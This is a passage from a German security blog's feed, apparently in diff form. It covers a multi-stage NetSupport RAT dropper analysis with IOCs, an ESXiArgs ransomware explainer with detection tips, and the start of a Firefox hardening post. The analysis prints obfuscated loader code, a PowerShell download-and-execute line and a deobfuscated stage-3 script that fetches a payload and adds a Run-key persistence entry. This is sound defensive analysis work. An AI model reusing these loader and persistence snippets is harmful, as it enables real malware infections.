style=&#34;color:#ae81ff&#34;&gt;0x9d&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;t[sl&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0AH&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;V1&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x3&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;T1lY&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dAB0AHAAcw&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;V1&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x27&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;K!KR&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;V3&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x22&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0N#q&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;V4&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x9e&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;3ZuB&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AGgAcwB1AHAAcABsAHkAdQBzAC4AYwBvAG0&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;V3&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x48&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s#8T&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BsAG8AYwBhAGwAc&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;V5&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x2c&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;YL@E&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;V3&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x71&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;l!tn&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;em&gt;Der gleiche Teil des Codes, aber entschärft und mit print-Statements. Das &amp;ldquo;ActiveXObject&amp;rdquo; ist jetzt eine einfache
+Klasse mit String dahinter.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Wenn man diesen Code dann mithilfe von NodeJS ausführt, erhält  man den folgenden Output:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;remnux@remnux:~/Analysis/nitrogen-diet-florida-monkey$ node nitrogen-diet-florida-monkey.js
+ShElL.APPlIcatioN
+scriptIng.fIlesysTemobjeCt
+[object Object]FolderExistsC:\userss
+[object Object]ShellExecute
+cmd/C POwerShElL -nop -w hidden -ep bypass -enc &amp;lt;BASE64String&amp;gt;  oPen 0
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;der Base64 kodierte String enthält diesen Powershellbefehl, der die nächste Stufe der Malware herunterlädt.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;IEX (New-Object Net.Webclient).downloadstring(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;STAGE3URL&amp;gt;&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;stage-3&#34;&gt;Stage 3&lt;/h2&gt;
+&lt;p&gt;Stufe 3 der Malware ist ein Powershell-Skript, das auch wieder obfuskiert ist, z.B. durch seltsame Groß/Kleinschreibung,
+String-Formatierung und großzügig verteilten `, die in Powershell als Escape verwendet werden (im Gegensatz zu den
+meisten anderen Sprachen, die \ verwenden). Zudem wurde der gesamte Code in eine Zeile geschrieben.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{rn`UM}=&amp;amp;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{2}{0}{1}&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-f&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;and&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;om&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Get-R&amp;#39;&lt;/span&gt;) -minimum &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; -maximum &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;; ${r`Rn`UM}=&amp;amp;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{3}{2}{0}{1}&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-f&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Rand&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;om&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Get&amp;#39;&lt;/span&gt;) -minimum &lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt; -maximum &lt;span style=&#34;color:#ae81ff&#34;&gt;9999&lt;/span&gt;; ${CH`Rs}=(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{8}{9}{6}{2}{10}{11}{12}{0}{14}{4}{13}{5}{3}{7}{1}&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-f&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;D&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PRSTUVWXYZ&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pstuvw&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;KLM&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;F&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;J&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mno&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;NO&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;abcdefghi&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;jkl&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;x&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;yz&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ABC&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;GHI&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;E&amp;#39;&lt;/span&gt;); ${R`STR}=&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;; ${r`An}=.(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{0}{1}{2}{3}&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;New-O&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;bje&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;t&amp;#39;&lt;/span&gt;) (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{1}{0}{3}{2}&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-f&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;m.Ra&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Syste&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;m&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ndo&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;em&gt;Ausschnitt aus dem Originalcode&lt;/em&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env pwsh&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;amp;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cd&amp;#39;&lt;/span&gt;) ${ENV&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;appdata}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;${link} = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://&amp;lt;payloadurl&amp;gt;/wp-content/plugins/giveme.php&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;${rnum} = &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;${rrnum} = &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;${chrs} = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;abcdefghijklmnopstuvwxyzABCDEFGHIJKLMNOPRSTUVWXYZ&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;${rstr} = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;${ran} = .(New-Object System.Random)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (${i} = &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ${i} &lt;span style=&#34;color:#f92672&#34;&gt;-lt&lt;/span&gt; ${r`NuM}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ${I}++) { ${rstr} += ${chrs}[${ran}.next.Invoke(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, ${chrs}.&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;length&amp;#34;&lt;/span&gt;)] }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;${rzip} = ${rstr} + &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.zip&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;${path} = ${ENV&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;`APPDATA} + &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\&amp;#39;&lt;/span&gt; + ${rzip}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;${pzip} = ${ENV&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; APPDATA} + &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\ONEN0TEupdate_&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;write-host (Start-Bitstransfer) -Source ${link} -Destination ${path}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;amp;(Expand-Archive -path ${path} -destinationpath ${pzip})
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;${fold} = &amp;amp;(Get-Item) ${pzip} -Force
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;${fold}.Attributes = Hidden
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;amp;(Remove-Item) -path ${path}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;amp;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cd&amp;#39;&lt;/span&gt;) ${pzip}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Write-Output Start client32.exe
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;${fstr} = ${ENV&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;appdata} + &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.\ONEN0TEupdate_1337\client32.exe&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;${rnm} = ONEN0TEupdate_1337
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Write-Output New-ItemProperty -Path HKCU&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name ONEN0TEupdate_1337 -Value ${fstr}  -PropertyType String
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;em&gt;Stage3, aufgeräumt und vereinfacht&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Stufe 3 ist die Stufe, die letztendlich die eigentliche Payload herunterlädt. sowie einen Autostart-Registrykey
+erstellt.
+Bei der Payload handelt es sich um eine vorkonfigurierte Version von NetSupport Manager, die sich mit dem C2-Server
+verbindet.&lt;/p&gt;
+&lt;h2 id=&#34;iocs&#34;&gt;IOCs&lt;/h2&gt;
+&lt;h3 id=&#34;c2-server&#34;&gt;C2-Server&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;blahadfurtik.com:5222 (IP: 89.22.237.94 )&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;lokalfilesystem&#34;&gt;Lokal/Filesystem&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Ordner mit dem Namen &amp;ldquo;ONEN0TEupdate_XXXX&amp;rdquo; in &lt;code&gt;C:/Users/&amp;lt;USER&amp;gt;/AppData/Roaming/&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Registry-Key unter &lt;code&gt;HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; mit dem gleichen Namen wie der Ordner in
+Appdata und zu client32.exe in diesem zeigend&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;p&gt;Verwendetes Sample: SHA256:00d87e984f0fcd2e8fb55e4b83d86027dac67fd073958a95cbc98961ab940f4b
+Quelle: bazaar.abuse.ch&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>ESXiArgs</title>
+      <link>https://www.jmbit.de/blog/2023-02-05-esxiargs/</link>
+      <pubDate>Sun, 05 Feb 2023 14:36:45 +0100</pubDate>
+      
+      <guid>https://www.jmbit.de/blog/2023-02-05-esxiargs/</guid>
+      <description>UPDATE Mittlerweile ist eine neue Variante im Umlauf, die vmdks unwiederruflich verschlüsselt! ESXiArgs ist eine vermutlich neue Ransomware-Familie, die ESXi-Server angreift und darauf laufende VMs (teilweise) verschlüsselt. Der wahrscheinlichste Angriffsvektor ist derzeit CVE-2021-21974, ein Heap-Overflow -&amp;gt; RCE Exploit. Benannt ist die Malware danach, dass sie dem Namen verschlüsselter Dateien &amp;ldquo;.args&amp;rdquo; anhängt.
+Laut ONYPHE sind 2,112 IPs kompromittiert (Stand 5.2.2023):
+Was ist passiert? Auf den betroffenen ESXi-Servern wurde vermutlich unter Ausnutzung von CVE-2021-21974 eine reverse shell installiert.</description>
+      <content>&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;UPDATE&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Mittlerweile ist eine neue Variante im Umlauf, die vmdks unwiederruflich verschlüsselt!&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;ESXiArgs ist eine vermutlich neue Ransomware-Familie, die ESXi-Server angreift und darauf laufende VMs (teilweise)
+verschlüsselt. Der wahrscheinlichste Angriffsvektor ist derzeit
+&lt;a href=&#34;https://www.vmware.com/security/advisories/VMSA-2021-0002.html&#34;&gt;CVE-2021-21974&lt;/a&gt;, ein Heap-Overflow -&amp;gt; RCE Exploit.
+Benannt ist die Malware danach, dass sie dem Namen verschlüsselter Dateien &amp;ldquo;.args&amp;rdquo; anhängt.&lt;/p&gt;
+&lt;p&gt;Laut ONYPHE sind 2,112 IPs kompromittiert (Stand 5.2.2023):&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://twitter.com/onyphe/status/1622272331421736962&#34;&gt;&lt;img alt=&#34;Tweet von Onyphe zu kompromittierten Hosts&#34; src=&#34;https://www.jmbit.de/img/blog/esxiargs_onyphe.jpg&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;was-ist-passiert&#34;&gt;Was ist passiert?&lt;/h2&gt;
+&lt;p&gt;Auf den betroffenen ESXi-Servern wurde vermutlich unter Ausnutzung von CVE-2021-21974 eine reverse shell installiert.
+In dem &lt;a href=&#34;https://bazaar.abuse.ch/sample/773d147a031d8ef06ee8ec20b614a4fd9733668efeb2b05aa03e36baaf082878/#yara&#34;&gt;Sample&lt;/a&gt;
+der Backdoor, das ich analysiert habe, wurde auf port 8008 eine Webshell gestartet:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;HTTPServer((&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8008&lt;/span&gt;), PostServer)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;serve_forever()
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ich habe leider nur die python-Datei selbst, da das Skript, das die VMs verschlüsselt, jedoch die Datei
+&lt;code&gt;/etc/rc.local.d/local.sh&lt;/code&gt; leert, ist anzunehmen, dass das Python-Skript selbst von dort aufgerufen wird, also bei jedem
+reboot neu geladen wird.&lt;/p&gt;
+&lt;p&gt;Diese Reverse-Shell wurde dann verwendet, um mehrere Dateien unter /tmp/ abzulegen und dann die darunter befindliche
+&lt;code&gt;compromise.sh&lt;/code&gt; auszuführen. Dieses Shellscript verschlüsselt alle Dateien, deren Namen auf &amp;ldquo;*.vmdk&amp;rdquo;, &amp;ldquo;*.vmx&amp;rdquo;, &amp;ldquo;*.vmxf&amp;rdquo;,
+&amp;ldquo;*.vmsd&amp;rdquo;, &amp;ldquo;*.vmsn&amp;rdquo;, &amp;ldquo;*.vswp&amp;rdquo;, &amp;ldquo;*.vmss&amp;rdquo;, &amp;ldquo;*.nvram&amp;rdquo; oder &amp;ldquo;*.vmem&amp;rdquo; enden, und die kleiner als 128MB sind. Bei
+Dateien, die größer als 128MB sind, werden nur 100 1MB-Blöcke in der Datei verschlüsselt. Dies bedeutet, dass die VMs
+selbst in der Regel relativ einfach wiederherstellbar sind. Am Ende dieses Artikels werde ich in der Linksammlung einige
+Anleitungen verlinken. Sollten Sie dabei Probleme haben, können Sie auch gerne &lt;a href=&#34;https://www.jmbit.de/about/&#34;&gt;auf mich zukommen&lt;/a&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;woran-kann-ich-einen-befall-erkennen&#34;&gt;Woran kann ich einen Befall erkennen?&lt;/h2&gt;
+&lt;p&gt;Sollte das Virus bereits ausgeführt worden sein, sehen Sie auf Port 443 des Servers statt der gewohnten Web-UI diese
+Website:&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Ransom Note&#34; src=&#34;https://www.jmbit.de/img/blog/esxiargs-ransomnote.jpg&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Die Backdoor, die vermutlich für die Infektion verwendet wird/wurde, läuft als Python Webserver. In diesem Fall lief er auf
+Port 8008, es wäre aber auch so ziemlich jeder andere Port denkbar. Mit &lt;code&gt;esxcli network ip connection list&lt;/code&gt; können Sie
+sich auf dem ESXi-Server anzeigen, welche Netzwerkdienste aktuell laufen. Ebenso sollte in /etc/rc.local.d/ ein Eintrag
+zu finden sein, der das Python-Script startet. Das Skript selbst dürfte &lt;code&gt;store/packages/vmtools.py&lt;/code&gt; heißen.&lt;/p&gt;
+&lt;h2 id=&#34;welche-voraussetzungen-für-einen-befall-gibt-es&#34;&gt;Welche Voraussetzungen für einen Befall gibt es?&lt;/h2&gt;
+&lt;p&gt;Der ESXi-Server muss, damit CVE-2021-21974 ausgenutzt werden kann, auf Port 427 aus dem Internet erreichbar sein, sowie
+auf einer Version vor ESXi70U1c-17325551 (ESXi 7.0), ESXi670-202102401-SG (ESXi 6.7) oder ESXi650-202102101-SG (ESXi 6.5)
+sein. Da diese Malware aber eine bereits deployte Hintertür ausnutzt, reicht es, wenn diese Konstellation in der
+Vergangenheit existiert hat, um kompromittiert werden zu können (Gesetzt, die Hintertür ist weiterhin aus dem Internet
+erreichbar)&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;linksammlung&#34;&gt;Linksammlung&lt;/h2&gt;
+&lt;h3 id=&#34;quellen-und-weiterführendes&#34;&gt;Quellen und Weiterführendes:&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.bleepingcomputer.com/news/security/massive-esxiargs-ransomware-attack-targets-vmware-esxi-servers-worldwide/&#34;&gt;https://www.bleepingcomputer.com/news/security/massive-esxiargs-ransomware-attack-targets-vmware-esxi-servers-worldwide/&lt;/a&gt;
+&lt;a href=&#34;https://blogs.juniper.net/en-us/threat-research/a-custom-python-backdoor-for-vmware-esxi-servers&#34;&gt;https://blogs.juniper.net/en-us/threat-research/a-custom-python-backdoor-for-vmware-esxi-servers&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;mögliche-anleitungen--ansätze&#34;&gt;Mögliche Anleitungen / Ansätze&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;Ich übernehme KEINE Verantwortung dafür, ob diese Anleitungen funktionieren.&lt;/strong&gt; Ich habe Online sowohl von Erfolgen als
+auch Fehlschlägen gelesen. Ich empfehle Ihnen, sich bei wichtigen Daten an Experten zu wenden und die Wiederherstellung
+nicht selbst zu versuchen.
+&lt;a href=&#34;https://enes.dev/&#34;&gt;https://enes.dev/&lt;/a&gt;
+&lt;a href=&#34;https://www.bleepingcomputer.com/forums/t/782193/esxi-ransomware-help-and-support-topic-esxiargs-args-extension/?p=5470599&#34;&gt;https://www.bleepingcomputer.com/forums/t/782193/esxi-ransomware-help-and-support-topic-esxiargs-args-extension/?p=5470599&lt;/a&gt;
+&lt;a href=&#34;https://www.bleepingcomputer.com/forums/t/782193/esxi-ransomware-help-and-support-topic-esxiargs-args-extension/?p=5470896&#34;&gt;https://www.bleepingcomputer.com/forums/t/782193/esxi-ransomware-help-and-support-topic-esxiargs-args-extension/?p=5470896&lt;/a&gt;
+&lt;a href=&#34;https://kb.vmware.com/s/article/1026353&#34;&gt;https://kb.vmware.com/s/article/1026353&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;betroffene-esxi-server&#34;&gt;Betroffene ESXi-Server&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.shodan.io/search?query=html%3A%22TOX_ID%22&#34;&gt;https://www.shodan.io/search?query=html%3A%22TOX_ID%22&lt;/a&gt;
+&lt;a href=&#34;https://twitter.com/onyphe/status/1622272331421736962&#34;&gt;https://twitter.com/onyphe/status/1622272331421736962&lt;/a&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Firefox absichern</title>
+      <link>https://www.jmbit.de/blog/2023-01-27-securing-firefox/</link>
+      <pubDate>Sat, 28 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.jmbit.de/blog/2023-01-27-securing-firefox/</guid>
+      <description>Webbrowser-Sicherheit an sich hat sich in den letzten Jahrzehnten seit ihrer Erfindung und Verbreitung massiv verbessert. Einst waren die größten Gefahren, dass eine Website über einen Exploit in der Browser-Engine direkten Zugriff auf das lokale Dateisystem erlangt. Mittlerweile ist diese Gefahr zwar noch vorhanden, aber bei weitem seltener. Die häufigsten Angriffe auf Browser betreffen nicht mehr den Browser an sich, sondern die Inhalte, die darin dargestellt werden. Da mittlerweile ein Großteil unseres Lebens digital ist und sich dieses digitale Leben zumindest am Desktop und Laptop großteils im Webbrowser abspielt, sind diese Inhalte für Angreifer interessanter den je.</description>
+      <content>&lt;p&gt;Webbrowser-Sicherheit an sich hat sich in den letzten Jahrzehnten seit ihrer Erfindung und Verbreitung massiv
+verbessert.  Einst waren die größten Gefahren, dass eine Website über einen Exploit in der Browser-Engine direkten
+Zugriff auf das lokale Dateisystem erlangt.  Mittlerweile ist diese Gefahr zwar noch vorhanden, aber bei weitem
+seltener. Die häufigsten Angriffe auf Browser betreffen nicht mehr den Browser an sich, sondern die Inhalte, die darin
+dargestellt werden.  Da mittlerweile ein Großteil unseres Lebens digital ist und sich dieses digitale Leben zumindest am
+Desktop und Laptop großteils im Webbrowser abspielt, sind diese Inhalte für Angreifer interessanter den je.&lt;br&gt;
